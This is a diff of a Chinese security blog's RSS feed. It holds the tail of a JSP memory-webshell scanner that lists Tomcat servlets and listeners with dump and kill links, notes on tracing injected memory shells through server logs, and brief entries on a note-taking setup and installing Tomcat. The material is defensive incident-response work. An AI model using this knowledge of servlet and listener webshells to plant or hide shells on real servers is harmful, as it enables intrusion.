+                        &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;tr&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;servletClassName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;servletClass&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;servletClassLoaderName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                        &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                            &lt;span class="n"&gt;servletClassLoaderName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;servletClass&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClassLoader&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                        &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="o"&gt;}&lt;/span&gt;
+                        &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;%d&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;&amp;lt;a href=\&amp;#34;?action=dump&amp;amp;className=%s\&amp;#34;&amp;gt;dump&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;&amp;lt;a href=\&amp;#34;?action=kill&amp;amp;servletName=%s\&amp;#34;&amp;gt;kill&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;#34;&lt;/span&gt;
+                                &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;servletId&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;
+                                &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;servletName1&lt;/span&gt;
+                                &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;servletMapPath&lt;/span&gt;
+                                &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;servletClassName&lt;/span&gt;
+                                &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;servletClassLoaderName&lt;/span&gt;
+                                &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;classFileIsExists&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servletClass&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+                                &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;servletClassName&lt;/span&gt;
+                                &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;servletName1&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
+                        &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;/tr&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                    &lt;span class="n"&gt;servletId&lt;/span&gt;&lt;span class="o"&gt;++;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;/tbody&amp;gt;&amp;lt;/table&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;listeners&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getListenerList&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;listeners&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;listeners&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;size&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;tbody&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;ServletRequestListener&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;newListeners&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
+                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;listeners&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="k"&gt;instanceof&lt;/span&gt; &lt;span class="n"&gt;ServletRequestListener&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="n"&gt;newListeners&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ServletRequestListener&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+
+                &lt;span class="c1"&gt;// Scan listener
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;h4&amp;gt;Listener scan result&amp;lt;/h4&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;table border=\&amp;#34;1\&amp;#34; cellspacing=\&amp;#34;0\&amp;#34; width=\&amp;#34;95%\&amp;#34; style=\&amp;#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\&amp;#34;&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;thead&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;ID&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;20%\&amp;#34;&amp;gt;Listener class&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;30%\&amp;#34;&amp;gt;Listener classLoader&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;35%\&amp;#34;&amp;gt;Listener class file path&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;dump class&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;kill&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;/thead&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;tbody&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ServletRequestListener&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;newListeners&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;tr&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;%d&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;&amp;lt;a href=\&amp;#34;?action=dump&amp;amp;className=%s\&amp;#34;&amp;gt;dump&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;&amp;lt;a href=\&amp;#34;?action=kill&amp;amp;servletName=%s\&amp;#34;&amp;gt;kill&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;#34;&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getClassLoader&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;classFileIsExists&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;()));&lt;/span&gt;
+                    &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;/tr&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;++;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;/tbody&amp;gt;&amp;lt;/table&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+        &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;c0ny1&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;center&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="内存马排查"&gt;内存马排查&lt;/h2&gt;
+&lt;p&gt;如果是jsp注入，日志中排查可疑jsp的访问请求&lt;br /&gt;
+根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。&lt;br /&gt;
+如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法&lt;br /&gt;
+如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。&lt;br /&gt;
+如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200&lt;/p&gt;
+&lt;h1 id="整体演示"&gt;整体演示&lt;/h1&gt;</description>
+</item>
+<item>
 <title>个人知识库介绍(Obsidian+hugo)</title>
 <link>http://crkmythical.github.io/blog/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93%E5%8F%8A%E5%8D%9A%E5%AE%A2%E4%BB%8B%E7%BB%8Dobsidian+hugo+githubactions/</link>
 <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
 <guid>http://crkmythical.github.io/blog/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93%E5%8F%8A%E5%8D%9A%E5%AE%A2%E4%BB%8B%E7%BB%8Dobsidian+hugo+githubactions/</guid>
 <description>Beijing: ☀️ 🌡️+31°C 🌬️↑11km/h [[https://imcaviare.com/post/auto-deploy-hugo/][hug</description>
+</item>
+<item>
+<title>安装Tomcat-macOS版</title>
+<link>http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%89%E8%A3%85tomcat-macos%E7%89%88/</link>
+<pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+<guid>http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%89%E8%A3%85tomcat-macos%E7%89%88/</guid>
+<description>Beijing: ☀️ 🌡️+35°C 🌬️↘4km/h 安装Tomcat-macOS版 Homebrew安装 1 2 brew install tomcat@9 /opt/homebrew/opt/tomcat@9/bin/catalina run Configuration files: /opt/homebrew/etc/tomcat@9 echo 'export PATH=&amp;quot;/opt/homebrew/opt/tomcat@9/bin:$PATH&amp;quot;' &amp;gt;&amp;gt; ~/.zshrc If you need to have tomcat@9 first in your PATH brew services</description>
 </item>
 </channel>
 </rss>
